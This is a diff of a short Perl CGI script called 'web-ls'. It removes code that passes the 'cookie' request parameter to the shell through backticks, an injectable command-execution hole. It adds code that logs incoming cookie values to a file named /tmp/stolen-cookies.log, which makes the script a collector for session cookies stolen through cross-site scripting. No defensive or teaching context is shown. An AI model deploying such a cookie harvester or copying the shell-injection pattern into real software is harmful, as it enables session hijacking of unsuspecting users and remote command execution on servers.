@@ -3,20 +3,17 @@
 use strict;
 use CGI qw(:standard escapeHTML);
 
-my $cmd = "echo ".param("cookie");
+my $cookie = param("cookie");
+$cookie =~ s/;/\n/;
+
+my $f = "/tmp/stolen-cookies.log";
+
+open FILE, ">> $f";
+
+print FILE "---------------\n";
+print FILE "$cookie\n";
+print FILE "---------------\n";
 
 print header, start_html("web-ls");
-
-
-
-print "<h2>";
-print "$cmd";
-print "</h2>";
-print "<pre>\n";
-
-$cmd=`$cmd`;
-print "$cmd\n";
-
-print "</pre>";
 print end_html;
 
